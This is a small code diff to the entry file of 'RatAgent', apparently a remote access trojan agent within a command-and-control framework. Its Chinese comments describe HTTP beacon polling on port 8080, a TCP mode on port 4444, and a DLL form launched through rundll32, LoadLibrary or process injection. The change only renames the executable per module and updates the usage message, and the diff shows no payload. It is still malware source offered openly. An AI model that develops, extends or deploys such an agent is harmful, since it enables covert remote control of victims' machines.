@@ -1,9 +1,11 @@
-// main.cpp — RatAgent EXE 入口（薄壳：解析参数 → 启动运行核心 → 等待退出）
+// main.cpp — Agent 的 EXE 入口（所有模块共用；薄壳：解析参数 → 启动运行核心 → 等待退出）
 //
-// 用法：RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]
+// 用法：RatAgent.<module>.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]
 //   - 默认 beacon 模式（HTTP 轮询 8080，协议 §8）；
 //   - `-tcp` 切换为 TCP 长连接模式（4444，协议 §4/§6）；
 //   - argv 与 DLL 形态共用 agent_runtime 的同一套解析，两种产物行为一致。
+//
+// `<module>` 见 core/module_id.h（如 sys / screen），由各模块工程的能力清单 caps.cpp 决定。
 //
 // DLL 形态见 agent_dll.cpp（rundll32 / LoadLibrary / 注入）。
 #include "agent_runtime.h"
@@ -28,7 +30,7 @@ int main(int argc, char** argv) {
     const std::string argline = c2::agent_args_from_argv(argc, argv);
     if (!c2::agent_parse_args(argline, args, err)) {
         AGENT_LOG("[-] bad args (%s): %s\n", argline.c_str(), err.c_str());
-        AGENT_LOG("    usage: RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]\n");
+        AGENT_LOG("    usage: RatAgent.<module>.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]\n");
         c2::net_cleanup();
         return 2;
     }
